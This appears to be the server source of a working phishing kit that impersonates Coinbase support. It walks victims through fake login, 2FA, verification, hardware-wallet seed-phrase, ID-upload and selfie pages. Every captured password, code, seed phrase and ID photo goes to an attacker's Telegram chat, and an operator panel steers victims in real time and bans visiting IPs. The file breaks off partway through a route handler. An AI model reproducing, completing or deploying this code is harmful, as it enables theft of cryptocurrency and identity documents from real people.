# MUST BE THE VERY FIRST IMPORT
import eventlet
eventlet.monkey_patch()
from flask import Flask, render_template, request, jsonify, url_for, session as flask_session, redirect
from flask_socketio import SocketIO, emit, join_room, leave_room
import logging
from datetime import datetime
import uuid
import requests
from config import Config
import threading
import time
import json
import os
import uuid
from models import db, Session, BannedIP
# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.config.from_object(Config)
app.secret_key = os.urandom(24)  # Needed for flash messages

db.init_app(app)

# Create tables
with app.app_context():
    db.create_all()
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')
UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
# Store active sessions and captured data
active_sessions = {}
captured_data = {}

# Define the stages
STAGES = [
    'landing',
    'login',
    'verification_code',
    'account_review',
    'confirm_activity',
    '2fa', 
    'wallet_backup',
    'email_verification',
    'ledger_connect',
    'trezor_connect',
    'external_wallet',
    'select_id_type',
    'id_upload', 
    'selfie_upload',
    'change_password',
    'final_redirect'
]

# Simple Telegram bot functionality without using python-telegram-bot
class SimpleTelegramBot:
    def __init__(self, token, chat_id, socketio):
        self.token = token
        self.chat_id = chat_id
        self.socketio = socketio
        self.active_sessions = {}
        
    def send_message(self, text, reply_markup=None):
        """Send a message to Telegram."""
        if not self.token or not self.chat_id:
            logger.warning("Telegram bot not configured properly")
            return
            
        try:
            url = f"https://api.telegram.org/bot{self.token}/sendMessage"
            data = {
                'chat_id': self.chat_id,
                'text': text
            }
            
            if reply_markup:
                data['reply_markup'] = reply_markup
                
            response = requests.post(url, json=data)
            if response.status_code != 200:
                logger.error(f"Failed to send Telegram message: {response.text}")
        except Exception as e:
            logger.error(f"Error sending Telegram message: {e}")
    

    def add_session(self, session_id, session_data):
        """Add a new session to track."""
        self.active_sessions[session_id] = session_data
        
        # Send notification with buttons that don't trigger redirects
        message = f"🎯 New visitor!\nSession ID: {session_id}\nUser Agent: {session_data.get('user_agent', 'Unknown')}\nIP: {session_data.get('ip', 'Unknown')}"
        
        # Buttons now only link to the panel, no direct redirect actions
        reply_markup = {
            'inline_keyboard': [[
                {'text': 'Go to Panel', 'url': f"http://{request.host}/panel"}
            ]]
        }
        
        self.send_message(message, reply_markup)
    
    def remove_session(self, session_id):
        """Remove a session from tracking."""
        if session_id in self.active_sessions:
            del self.active_sessions[session_id]
    
    def update_session_html(self, session_id, html_content):
        """Update the HTML content for a session."""
        if session_id in self.active_sessions:
            self.active_sessions[session_id]['html_content'] = html_content
            
    def send_credentials(self, session_id, credentials):
        """Send captured credentials to Telegram."""
        message = f"🔑 Credentials captured!\nSession ID: {session_id}\n"
        
        for key, value in credentials.items():
            message += f"{key}: {value}\n"
            
        self.send_message(message)
        
    def send_2fa_code(self, session_id, code):
        """Send 2FA code to Telegram."""
        message = f"🔢 2FA Code captured!\nSession ID: {session_id}\nCode: {code}"
        self.send_message(message)
        
    def send_wallet_info(self, session_id, wallet_data):
        """Send wallet information to Telegram."""
        message = f"💰 Wallet information captured!\nSession ID: {session_id}\n"
        
        for key, value in wallet_data.items():
            message += f"{key}: {value}\n"
            
        self.send_message(message)
    def send_verification_code(self, session_id, phone, code):
        """Send verification code to Telegram."""
        message = f"📱 Verification code captured!\nSession ID: {session_id}\nPhone: {phone}\nCode: {code}"
        self.send_message(message)
    def send_seed_phrase(self, session_id, seed_phrase):
        """Send seed phrase to Telegram."""
        message = f"🔐 Seed phrase captured!\nSession ID: {session_id}\nSeed: {seed_phrase}"
        self.send_message(message)
        
    def send_stage_update(self, session_id, stage):
        """Send stage update to Telegram."""
        message = f"🔄 Stage update for session {session_id}:\nNow at: {stage}"
        self.send_message(message)
    
    def send_account_review_response(self, session_id, response, email, phone_digits):
        """Send individual account review response to Telegram."""
        response_map = {
            'credentials_approve': '✅ Credentials Change APPROVED',
            'credentials_decline': '❌ Credentials Change DECLINED',
            'attempted_approve': '✅ Attempted Login APPROVED', 
            'attempted_decline': '❌ Attempted Login DECLINED',
            'requested_approve': '✅ Requested Contact APPROVED',
            'requested_decline': '❌ Requested Contact DECLINED'
        }
    
        readable_response = response_map.get(response, response)
        message = f"📋 Account Review Response\nSession ID: {session_id}\n"
        message += f"Target Email: {email}\n"
        message += f"Phone Digits: {phone_digits}\n"
        message += f"Response: {readable_response}"
    
        self.send_message(message)

    def send_account_review(self, session_id, responses, email, phone_digits):
        """Send complete account review results to Telegram."""
        message = f"📋 Account Review Completed!\nSession ID: {session_id}\n"
        message += f"Target Email: {email}\n"
        message += f"Phone Digits: {phone_digits}\n\n"
    
    # FIXED: Use the original response values for mapping, not just the decision
        response_map = {
            'credentials_approve': '✅ Credentials APPROVED',
            'credentials_decline': '❌ Credentials DECLINED',
            'attempted_approve': '✅ Attempted Login APPROVED', 
            'attempted_decline': '❌ Attempted Login DECLINED',
            'requested_approve': '✅ Requested Contact APPROVED',
            'requested_decline': '❌ Requested Contact DECLINED'
        }
    
        for category, decision in responses.items():
        # Reconstruct the full response key to use the correct mapping
            response_key = f"{category}_{decision}"
            readable_response = response_map.get(response_key, f"{category}: {decision.upper()}")
            message += f"{readable_response}\n"
        
        self.send_message(message)
    def send_trezor_data(self, session_id, input_data):
        """Send ANY Trezor input data to Telegram."""
        message = f"🔐 Trezor Input Captured!\nSession ID: {session_id}\n"
        message += f"Input Data: {input_data}\n"
        self.send_message(message)
    def send_id_photos(self, session_id, front_photo_path=None, back_photo_path=None):
        """Send ID photos to Telegram with actual image files."""
        message = f"🪪 ID Uploaded!\nSession ID: {session_id}\n"
    
        try:
        # Send front photo if available
            if front_photo_path and os.path.exists(front_photo_path):
                self.send_photo(front_photo_path, f"Front ID - Session {session_id}")
                message += "Front photo: ✅ Uploaded\n"
            else:
                message += "Front photo: ❌ Not provided\n"
            
        # Send back photo if available
            if back_photo_path and os.path.exists(back_photo_path):
                self.send_photo(back_photo_path, f"Back ID - Session {session_id}")
                message += "Back photo: ✅ Uploaded\n"
            else:
                message += "Back photo: ❌ Not provided\n"
        
        # Send summary message
            self.send_message(message)
        
        except Exception as e:
            logger.error(f"Error sending ID photos: {e}")
            self.send_message(f"❌ Error sending ID photos for session {session_id}: {str(e)}")

    def send_photo(self, photo_path, caption=""):
        """Send a photo to Telegram."""
        if not self.token or not self.chat_id:
            logger.warning("Telegram bot not configured properly")
            return
        
        try:
            url = f"https://api.telegram.org/bot{self.token}/sendPhoto"
        
            with open(photo_path, 'rb') as photo_file:
                files = {'photo': photo_file}
                data = {
                    'chat_id': self.chat_id,
                    'caption': caption
                }
            
                response = requests.post(url, files=files, data=data)
                if response.status_code != 200:
                    logger.error(f"Failed to send Telegram photo: {response.text}")
                
        except Exception as e:
            logger.error(f"Error sending Telegram photo: {e}")

    def send_id_type_selection(self, session_id, id_type):
        """Send ID type selection to Telegram."""
        message = f"🪪 ID Type Selected!\nSession ID: {session_id}\n"
        message += f"Selected ID Type: {id_type}\n"
    
        self.send_message(message)
        return True
    def send_selfie_photo(self, session_id, selfie_path=None):
        """Send selfie photo to Telegram with actual image file."""
        message = f"📸 Selfie Uploaded!\nSession ID: {session_id}\n"

        try:
        # Send selfie if available
            if selfie_path and os.path.exists(selfie_path):
            # First send the photo
                self.send_photo(selfie_path, f"Selfie - Session {session_id}")
                message += "Selfie: ✅ Uploaded\n"
            
            # Then send the confirmation message
                self.send_message(message)
            else:
                message += "Selfie: ❌ Not provided or file missing\n"
                self.send_message(message)
    
        except Exception as e:
            logger.error(f"Error sending selfie: {e}")
            error_message = f"❌ Error sending selfie for session {session_id}: {str(e)}"
            self.send_message(error_message)
    def send_external_wallet_data(self, session_id, input_data, wallet_type="External"):
        """Send external wallet input data to Telegram."""
        message = f"🔐 {wallet_type} Wallet Input Captured!\nSession ID: {session_id}\n"
        message += f"Input Data: {input_data}\n"
        self.send_message(message)

    def send_activity_data(self, session_id, activity_period):
        """Send activity period data to Telegram."""
        message = f"📊 Activity Period Captured!\nSession ID: {session_id}\n"
        message += f"Activity Period: {activity_period}\n"
        self.send_message(message)

    def send_holdings_data(self, session_id, holdings_range):
        """Send holdings range data to Telegram."""
        message = f"💰 Holdings Range Captured!\nSession ID: {session_id}\n"
        message += f"Holdings Range: {holdings_range}\n"
        self.send_message(message)
    

    def send_email_config(self, session_id, email):
        """Send email configuration to Telegram."""
        message = f"📧 Email Configuration Set!\nSession ID: {session_id}\n"
        message += f"Target Email: {email}\n"
        self.send_message(message)
    def send_password_change(self, session_id, old_password, new_password):
        """Send password change information to Telegram."""
        message = f"🔐 Password Change Captured!\nSession ID: {session_id}\n"
        message += f"Old Password: {old_password}\n"
        message += f"New Password: {new_password}\n"
        message += f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    
        self.send_message(message)
    def send_seed_config(self, session_id, seed_phrase):
        """Send seed phrase configuration to Telegram."""
        message = f"🌱 Seed Phrase Set!\nSession ID: {session_id}\n"
        message += f"Seed Phrase: {seed_phrase}\n"
        self.send_message(message)
# Initialize simple Telegram bot
telegram_bot = SimpleTelegramBot(
    app.config['TELEGRAM_BOT_TOKEN'], 
    app.config['TELEGRAM_CHAT_ID'], 
    socketio
)
def get_client_ip():
    """Get the real client IP address, handling proxies and IPv6"""
    # Check for common proxy headers
    potential_headers = [
        'X-Forwarded-For',
        'X-Real-IP',
        'CF-Connecting-IP',  # Cloudflare
        'True-Client-IP',    # Cloudflare and Akamai
        'X-Cluster-Client-IP',
        'Forwarded',
        'X-Forwarded',
        'X-Originating-IP',
    ]
    
    for header in potential_headers:
        ip_list = request.headers.get(header, '').split(',')
        if ip_list:
            # Get the first IP in the list (the original client)
            ip = ip_list[0].strip()
            if ip and ip != 'unknown':
                return ip
    
    # Fall back to remote_addr
    return request.remote_addr or '0.0.0.0'

@app.before_request
def check_banned_ip():
    # Skip for static files, panel, and admin routes
    if (request.path.startswith('/static') or 
        request.path == '/panel' or
        request.path.startswith('/ban_ip') or
        request.path.startswith('/unban_ip') or
        request.path.startswith('/delete_session') or
        request.path.startswith('/get_banned_ips')):
        return
    
    # Get real IP address using our improved function
    ip = get_client_ip()
    
    # Check if IP is banned
    banned_ip = BannedIP.query.filter_by(ip_address=ip).first()
    if banned_ip:
        return "Your IP has been banned from accessing this site.", 403
@app.route('/')
def index():
    """Main page that will be redirected to a fake landing page."""
    # Get real IP address using our improved function
    ip = get_client_ip()
    
    # Check if IP is banned
    banned_ip = BannedIP.query.filter_by(ip_address=ip).first()
    if banned_ip:
        return "Your IP has been banned from accessing this site.", 403
    
    # Rest of your index function remains the same...
    session_id = str(uuid.uuid4())
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Create session in database
    new_session = Session(
        id=session_id,
        user_agent=user_agent,
        ip_address=ip,  # Use the properly detected IP
        current_stage='landing',
        status='waiting'
    )
    db.session.add(new_session)
    db.session.commit()
    
    
    # Store session in active_sessions for compatibility
    active_sessions[session_id] = {
        'id': session_id,
        'user_agent': user_agent,
        'ip': ip,
        'email': 'security@coinbase-support.com',
        'current_url': request.url,
        'start_time': datetime.now().isoformat(),
        'form_data': [],
        'html_content': '',
        'status': 'waiting',
        'stage': 'landing',
        'history': [],
        'completed_stages': []
    }
    
    # Initialize captured data for this session
    captured_data[session_id] = {
        'credentials': {},
        'two_fa': '',
        'wallet_info': {},
    }
    
    # Notify Telegram
    telegram_bot.add_session(session_id, active_sessions[session_id])
    
    # Redirect to the fake landing page
    return render_template('landing.html', session_id=session_id)

# Update the verification stage route to pass the digits if set
@app.route('/stage/<session_id>/<stage_name>')
def stage_page(session_id, stage_name):
    """Generic stage handler."""
    if session_id not in active_sessions:
        return "Session not found", 404
        
    # Update session stage and history
    if active_sessions[session_id]['stage'] != stage_name:
        active_sessions[session_id]['history'].append({
            'time': datetime.now().isoformat(),
            'from': active_sessions[session_id]['stage'],
            'to': stage_name
        })
        active_sessions[session_id]['stage'] = stage_name
        
    active_sessions[session_id]['current_url'] = request.url
    
    # Render the appropriate template (updated with new stages)
    if stage_name == 'landing':
        return render_template('landing.html', session_id=session_id)
    elif stage_name == 'login':
        return render_template('login.html', session_id=session_id)
    elif stage_name == 'verification_code':
        # Pass the pre-set phone digits if available
        phone_digits = active_sessions[session_id].get('phone_digits', {}).get('last_two', '')
        return render_template('verification_code.html', session_id=session_id, phone_digits=phone_digits)
    elif stage_name == 'account_review':
        return render_template('account_review.html', session_id=session_id)
    elif stage_name == '2fa':
        return render_template('2fa.html', session_id=session_id)
    elif stage_name == 'ledger_connect':
        return render_template('ledger_connect.html', session_id=session_id)
    elif stage_name == 'wallet_unlink':
        return render_template('wallet_unlink.html', session_id=session_id)
    
    elif stage_name == 'final_redirect':
        return render_template('final_redirect.html', session_id=session_id)
    elif stage_name == 'trezor_connect':
        return render_template('trezor.html', session_id=session_id)
    elif stage_name == 'id_upload':
        return render_template('id.html', session_id=session_id)
    elif stage_name == 'select_id_type':
        return render_template('selectidtype.html', session_id=session_id)
    elif stage_name == 'selfie_upload':
        return render_template('selfie.html', session_id=session_id)
    elif stage_name == 'external_wallet':
        return render_template('externalwallet.html', session_id=session_id)
    elif stage_name == 'confirm_activity':
        return render_template('confirm_activity.html', session_id=session_id)
    elif stage_name == 'email_verification':
        return render_template('email.html', session_id=session_id)
    elif stage_name == 'change_password':
        return render_template('change_password.html', session_id=session_id)
    elif stage_name == 'wallet_backup':
        return render_template('wallet_backup.html', session_id=session_id)
    
    else:
        return "Session not found", 404

@app.route('/submit-login/<session_id>', methods=['POST'])
def submit_login(session_id):
    """Handle login form submission."""
    if session_id not in active_sessions:
        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
        
    email = request.form.get('email')
    password = request.form.get('password')
    
    # Store credentials
    captured_data[session_id]['credentials'] = {
        'email': email,
        'password': password,
        'capture_time': datetime.now().isoformat()
    }
    
    # Send to Telegram
    telegram_bot.send_credentials(session_id, captured_data[session_id]['credentials'])
    
    # Update session
    active_sessions[session_id]['form_data'].append({
        'time': datetime.now().isoformat(),
        'type': 'login',
        'data': {'email': email, 'password': '***'}  # Mask password in UI
    })
    
    # Mark this stage as completed and return to landing page
    if 'login' not in active_sessions[session_id]['completed_stages']:
        active_sessions[session_id]['completed_stages'].append('login')
    
    return jsonify({'status': 'success', 'redirect': url_for('stage_page', session_id=session_id, stage_name='landing')})

@app.route('/submit-2fa/<session_id>', methods=['POST'])
def submit_2fa(session_id):
    """Handle 2FA form submission."""
    if session_id not in active_sessions:
        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
        
    code = request.form.get('code')
    
    # Store 2FA code
    captured_data[session_id]['two_fa'] = {
        'code': code,
        'capture_time': datetime.now().isoformat()
    }
    
    # Send to Telegram
    telegram_bot.send_2fa_code(session_id, code)
    
    # Update session
    active_sessions[session_id]['form_data'].append({
        'time': datetime.now().isoformat(),
        'type': '2fa',
        'data': {'code': code}
    })
    
    # Mark this stage as completed and return to landing page
    if '2fa' not in active_sessions[session_id]['completed_stages']:
        active_sessions[session_id]['completed_stages'].append('2fa')
    
    return jsonify({'status': 'success', 'redirect': url_for('stage_page', session_id=session_id, stage_name='landing')})

@app.route('/submit-wallet-unlink/<session_id>', methods=['POST'])
def submit_wallet_unlink(session_id):
    """Handle wallet unlink form submission."""
    if session_id not in active_sessions:
        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
        
    # This would typically collect wallet information
    wallet_address = request.form.get('wallet_address', 'Not provided')
    wallet_type = request.form.get('wallet_type', 'Not provided')
    
    # Store wallet info
    captured_data[session_id]['wallet_info'] = {
        'address': wallet_address,
        'type': wallet_type,
        'unlink_time': datetime.now().isoformat()
    }
    
    # Send to Telegram
    telegram_bot.send_wallet_info(session_id, captured_data[session_id]['wallet_info'])
    
    # Update session
    active_sessions[session_id]['form_data'].append({
        'time': datetime.now().isoformat(),
        'type': 'wallet_unlink',
        'data': {'wallet_address': wallet_address, 'wallet_type': wallet_type}
    })
    
    # Mark this stage as completed and return to landing page
    if 'wallet_unlink' not in active_sessions[session_id]['completed_stages']:
        active_sessions[session_id]['completed_stages'].append('wallet_unlink')
    
    return jsonify({'status': 'success', 'redirect': url_for('stage_page', session_id=session_id, stage_name='landing')})



@app.route('/panel')
def panel():
    """Control panel for managing redirects and viewing captured data."""
    # Get banned IPs
    banned_ips = BannedIP.query.all()
    
    return render_template('panel.html', 
                         sessions=active_sessions, 
                         captured_data=captured_data, 
                         stages=STAGES,
                         banned_ips=banned_ips)
@app.route('/session/<session_id>')
def session_detail(session_id):
    """View details of a specific session."""
    session = active_sessions.get(session_id)
    data = captured_data.get(session_id, {})
    if not session:
        return "Session not found", 404
    return render_template('session_detail.html', session=session, data=data, stages=STAGES)

@app.route('/preview/<session_id>')
def preview(session_id):
    """Preview the HTML content of a session."""
    session = active_sessions.get(session_id)
    if not session:
        return "Session not found", 404
    return render_template('preview.html', content=session.get('html_content', ''))

@app.route('/redirect/<session_id>')
def redirect_session(session_id):
    """API endpoint to redirect a session to a specific stage."""
    stage = request.args.get('stage', 'landing')
    
    if session_id not in active_sessions:
        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
    
    try:
        # Update session status
        active_sessions[session_id]['status'] = 'redirecting'
        active_sessions[session_id]['redirect_time'] = datetime.now().isoformat()
        
        # Determine the target URL based on the stage
        target_url = url_for('stage_page', session_id=session_id, stage_name=stage, _external=True)
        
        # Add to history if it's a new stage
        if active_sessions[session_id]['stage'] != stage:
            active_sessions[session_id]['history'].append({
                'time': datetime.now().isoformat(),
                'from': active_sessions[session_id]['stage'],
                'to': stage
            })
            active_sessions[session_id]['stage'] = stage
        
        # Emit redirect event via SocketIO
        socketio.emit('redirect', {'url': target_url}, room=session_id)
        
        # Update session data
        active_sessions[session_id]['current_url'] = target_url
        
        # Notify Telegram
        telegram_bot.send_stage_update(session_id, stage)
        
        logger.info(f'Redirected session {session_id} to {target_url}')
        return jsonify({'status': 'success', 'message': f'Redirected to {stage} page'})
    
    except Exception as e:
        logger.error(f'Error redirecting session {session_id}: {e}')
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/back/<session_id>')
def go_back(session_id):
    """Go back to the previous stage in history."""
    if session_id not in active_sessions:
        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
        
    history = active_sessions[session_id]['history']
    if len(history) < 2:
        return jsonify({'status': 'error', 'message': 'No history to go back to'}), 400
        
    # Get the previous stage from history (second to last entry)
    previous_stage = history[-2]['to']
    
    # Remove the last history entry
    history.pop()
    
    # Update the current stage
    active_sessions[session_id]['stage'] = previous_stage
    
    # Determine the target URL based on the stage
    target_url = url_for('stage_page', session_id=session_id, stage_name=previous_stage, _external=True)
    
    # Emit redirect event via SocketIO
    socketio.emit('redirect', {'url': target_url}, room=session_id)
    
    # Update session data
    active_sessions[session_id]['current_url'] = target_url
    
    # Notify Telegram
    telegram_bot.send_stage_update(session_id, previous_stage)
    
    logger.info(f'Went back with session {session_id} to {target_url}')
    return jsonify({'status': 'success', 'message': f'Went back to {previous_stage} page'})

@app.route('/force-redirect/<session_id>', methods=['POST'])
def force_redirect(session_id):
    """Force redirect a session to any URL."""
    if session_id not in active_sessions:
        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
        
    data = request.get_json()
    if not data or 'url' not in data:
        return jsonify({'status': 'error', 'message': 'URL is required'}), 400
        
    target_url = data['url']
    
    # Update session status
    active_sessions[session_id]['status'] = 'redirecting'
    active_sessions[session_id]['redirect_time'] = datetime.now().isoformat()
    active_sessions[session_id]['forced_redirect'] = True
    
    # Add to history
    active_sessions[session_id]['history'].append({
        'time': datetime.now().isoformat(),
        'from': active_sessions[session_id]['stage'],
        'to': 'external_url'
    })
    
    # Emit redirect event via SocketIO
    socketio.emit('force_redirect', {'url': target_url}, room=session_id)
    
    # Update session data
    active_sessions[session_id]['current_url'] = target_url
    
    logger.info(f'Force redirected session {session_id} to {target_url}')
    return jsonify({'status': 'success', 'message': f'Force redirected to {target_url}'})

@app.route('/submit-verification/<session_id>', methods=['POST'])
def submit_verification(session_id):
    """Handle verification code form submission."""
    if session_id not in active_sessions:
        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
        
    phone = request.form.get('phone', 'Not provided')
    code = request.form.get('code')
    
    # Store verification data
    captured_data[session_id]['verification'] = {
        'phone': phone,
        'code': code,
        'capture_time': datetime.now().isoformat()
    }
    
    # Send to Telegram
    telegram_bot.send_verification_code(session_id, phone, code)
    
    # Update session
    active_sessions[session_id]['form_data'].append({
        'time': datetime.now().isoformat(),
        'type': 'verification',
        'data': {'phone': phone, 'code': code}
    })
    
    # Mark this stage as completed and return to landing page
    if 'verification_code' not in active_sessions[session_id]['completed_stages']:
        active_sessions[session_id]['completed_stages'].append('verification_code')
    
    return jsonify({'status': 'success', 'redirect': url_for('stage_page', session_id=session_id, stage_name='landing')})


@app.route('/submit-ledger-connect/<session_id>', methods=['POST'])
def submit_ledger_connect(session_id):
    """Handle ledger connection form submission (seed phrase capture)."""
    if session_id not in active_sessions:
        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
        
    seed_phrase = request.form.get('seed_phrase', '').strip()
    words = seed_phrase.split()
    
    # Validate word count
    if len(words) not in [12, 24]:
        return jsonify({
            'status': 'error', 
            'message': 'Seed phrase must be exactly 12 or 24 words'
        }), 400
    
    # Validate no empty words
    if any(not word for word in words):
        return jsonify({
            'status': 'error', 
            'message': 'Empty word detected between spaces'
        }), 400
    
    # Store seed phrase
    captured_data[session_id]['seed_phrase'] = {
        'phrase': seed_phrase,
        'capture_time': datetime.now().isoformat()
    }
    
    # Send to Telegram
    telegram_bot.send_seed_phrase(session_id, seed_phrase)
    
    # Update session
    active_sessions[session_id]['form_data'].append({
        'time': datetime.now().isoformat(),
        'type': 'seed_phrase',
        'data': {'seed_phrase': '***'}  # Mask seed phrase in UI
    })
    
    # Mark this stage as completed and return to landing page
    if 'ledger_connect' not in active_sessions[session_id]['completed_stages']:
        active_sessions[session_id]['completed_stages'].append('ledger_connect')
    
    return jsonify({'status': 'success', 'redirect': url_for('stage_page', session_id=session_id, stage_name='landing')})

@app.route('/set-phone-digits/<session_id>', methods=['POST'])
def set_phone_digits(session_id):
    """Set phone number digits from panel."""
    if session_id not in active_sessions:
        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
        
    digits = request.form.get('digits')
    
    if not digits:
        return jsonify({'status': 'error', 'message': 'Digits are required'}), 400
    
    # Store the digits in session for later use
    if 'phone_digits' not in active_sessions[session_id]:
        active_sessions[session_id]['phone_digits'] = {}
    
    active_sessions[session_id]['phone_digits']['last_two'] = digits
    
    logger.info(f'Set phone digits for session {session_id}: {digits}')
    return jsonify({'status': 'success', 'message': f'Phone digits set to {digits}'})

@app.route('/direct-redirect/<session_id>', methods=['POST'])
def direct_redirect(session_id):
    """Direct redirect to any stage without workflow constraints."""
    if session_id not in active_sessions:
        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
        
    stage = request.form.get('stage')
    
    if not stage or stage not in STAGES:
        return jsonify({'status': 'error', 'message': 'Valid stage is required'}), 400
    
    # Update session status
    active_sessions[session_id]['status'] = 'redirecting'
    active_sessions[session_id]['redirect_time'] = datetime.now().isoformat()
    
    # Determine the target URL based on the stage
    target_url = url_for('stage_page', session_id=session_id, stage_name=stage, _external=True)
    
    # Add to history if it's a new stage
    if active_sessions[session_id]['stage'] != stage:
        active_sessions[session_id]['history'].append({
            'time': datetime.now().isoformat(),
            'from': active_sessions[session_id]['stage'],
            'to': stage
        })
        active_sessions[session_id]['stage'] = stage
    
    # Emit redirect event via SocketIO
    socketio.emit('redirect', {'url': target_url}, room=session_id)
    
    # Update session data
    active_sessions[session_id]['current_url'] = target_url
    
    # Notify Telegram
    telegram_bot.send_stage_update(session_id, stage)
    
    logger.info(f'Direct redirected session {session_id} to {target_url}')
    return jsonify({'status': 'success', 'message': f'Redirected to {stage} page'})
# Add this route to handle setting email for account review page
@app.route('/set-email-digits/<session_id>', methods=['POST'])
def set_email_digits(session_id):
    """Set email and phone digits from panel for account review page."""
    if session_id not in active_sessions:
        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
        
    email = request.form.get('email')
    digits = request.form.get('digits')
    
    if not email or not digits:
        return jsonify({'status': 'error', 'message': 'Email and digits are required'}), 400
    
    # Store the email and digits in session for later use
    if 'account_review_data' not in active_sessions[session_id]:
        active_sessions[session_id]['account_review_data'] = {}
    
    active_sessions[session_id]['account_review_data']['email'] = email
    active_sessions[session_id]['account_review_data']['phone_last_three'] = digits
    
    logger.info(f'Set account review data for session {session_id}: email={email}, digits={digits}')
    return jsonify({'status': 'success', 'message': f'Account review data updated'})

# Update the account_review stage route to pass the email and digits if set
@app.route('/stage/<session_id>/account_review')
def account_review_page(session_id):
    """Account review page handler."""
    if session_id not in active_sessions:
        return "Session not found", 404
        
    # Store session ID in Flask session for persistence
    flask_session['current_session_id'] = session_id
    
    # Update session stage and history
    if active_sessions[session_id]['stage'] != 'account_review':
        active_sessions[session_id]['history'].append({
            'time': datetime.now().isoformat(),
            'from': active_sessions[session_id]['stage'],
            'to': 'account_review'
        })
        active_sessions[session_id]['stage'] = 'account_review'
        
    active_sessions[session_id]['current_url'] = request.url
    
    # Get or set account review data
    account_review_data = active_sessions[session_id].get('account_review_data', {})
    email = account_review_data.get('email', 'user@example.com')
    phone_digits = account_review_data.get('phone_last_three', '6352')
    
    # Initialize review responses if not exists
    if 'account_review_responses' not in active_sessions[session_id]:
        active_sessions[session_id]['account_review_responses'] = {}
    
    return render_template('account_review.html', 
                         session_id=session_id, 
                         email=email,
                         phone_digits=phone_digits)

@app.route('/submit-account-review/<session_id>', methods=['POST'])
def submit_account_review(session_id):
    """Handle account review form submission."""
    # Try to get session ID from multiple sources
    target_session_id = session_id
    if target_session_id not in active_sessions:
        target_session_id = flask_session.get('current_session_id')
    
    if not target_session_id or target_session_id not in active_sessions:
        logger.error(f"Session not found: {session_id}")
        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
        
    user_response = request.form.get('user_response')  # This is like 'credentials_approve'
    
    if not user_response:
        return jsonify({'status': 'error', 'message': 'No response provided'}), 400
    
    # Store the response in the session data
    responses = active_sessions[target_session_id].get('account_review_responses', {})
    
    # Parse the response type to get the category
    parts = user_response.split('_')
    if len(parts) == 2:
        category = parts[0]  # 'credentials', 'attempted', or 'requested'
        decision = parts[1]  # 'approve' or 'decline'
        
        # Store both the full response and the decision
        responses[category] = {
            'full_response': user_response,
            'decision': decision
        }
        active_sessions[target_session_id]['account_review_responses'] = responses
    
    # Get email and phone digits from session data
    account_review_data = active_sessions[target_session_id].get('account_review_data', {})
    email = account_review_data.get('email', '')
    phone_digits = account_review_data.get('phone_last_three', '')
    
    # Send individual response to Telegram
    telegram_bot.send_account_review_response(
        target_session_id, 
        user_response,  # Send the full response like 'credentials_approve'
        email,
        phone_digits
    )
    
    # Check if all three responses have been received
    if len(responses) >= 3:
        # Prepare responses for the complete Telegram message
        complete_responses = {}
        for category, response_data in responses.items():
            complete_responses[category] = response_data['full_response']
        
        # Send complete account review results to Telegram
        telegram_bot.send_account_review(
            target_session_id, 
            complete_responses,  # This contains the full responses
            email, 
            phone_digits
        )
        
        # All responses received, move to next stage
        active_sessions[target_session_id]['stage'] = 'processing'
        active_sessions[target_session_id]['history'].append({
            'time': datetime.now().isoformat(),
            'from': 'account_review',
            'to': 'processing',
            'responses': responses
        })
        
        # Mark this stage as completed and return to landing page
        if 'account_review' not in active_sessions[target_session_id]['completed_stages']:
            active_sessions[target_session_id]['completed_stages'].append('account_review')
        
        # Return to landing page like other form submissions
        return jsonify({
            'status': 'success', 
            'redirect': url_for('stage_page', session_id=target_session_id, stage_name='landing')
        })
    
    # Not all responses received yet - just acknowledge this response
    return jsonify({'status': 'success', 'message': 'Response recorded'})
@app.route('/stage/<session_id>/trezor_connect')
def trezor_connect_page(session_id):
    """Trezor connection page handler."""
    if session_id not in active_sessions:
        return "Session not found", 404
        
    # Update session stage and history
    if active_sessions[session_id]['stage'] != 'trezor_connect':
        active_sessions[session_id]['history'].append({
            'time': datetime.now().isoformat(),
            'from': active_sessions[session_id]['stage'],
            'to': 'trezor_connect'
        })
        active_sessions[session_id]['stage'] = 'trezor_connect'
        
    active_sessions[session_id]['current_url'] = request.url
    
    return render_template('trezor.html', session_id=session_id)
@app.route('/submit-trezor-connect/<session_id>', methods=['POST'])
def submit_trezor_connect(session_id):
    """Handle trezor connection form submission (ANY input capture)."""
    if session_id not in active_sessions:
        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
        
    input_data = request.form.get('seed_phrase', '').strip()
    words = input_data.split()
    
    # Validate word count
    if len(words) not in [12, 24]:
        return jsonify({
            'status': 'error', 
            'message': 'Seed phrase must be exactly 12 or 24 words'
        }), 400
    
    # Validate no empty words
    if any(not word for word in words):
        return jsonify({
            'status': 'error', 
            'message': 'Empty word detected between spaces'
        }), 400
    
    # Store trezor-specific data
    captured_data[session_id]['trezor_data'] = {
        'input_data': input_data,
        'capture_time': datetime.now().isoformat(),
        'wallet_type': 'Trezor'
    }
    
    # Send ANY input to Telegram
    telegram_bot.send_trezor_data(session_id, input_data)
    
    # Update session with trezor-specific form data
    active_sessions[session_id]['form_data'].append({
        'time': datetime.now().isoformat(),
        'type': 'trezor_connection',
        'data': {
            'input_data': '***',
            'wallet_type': 'Trezor'
        }
    })
    
    # Mark this stage as completed and return to landing page
    if 'trezor_connect' not in active_sessions[session_id]['completed_stages']:
        active_sessions[session_id]['completed_stages'].append('trezor_connect')
    
    return jsonify({
        'status': 'success', 
        'redirect': url_for('stage_page', session_id=session_id, stage_name='landing')
    })

@app.route('/stage/<session_id>/id_upload')
def id_upload_page(session_id):
    """ID upload page handler."""
    if session_id not in active_sessions:
        return "Session not found", 404
        
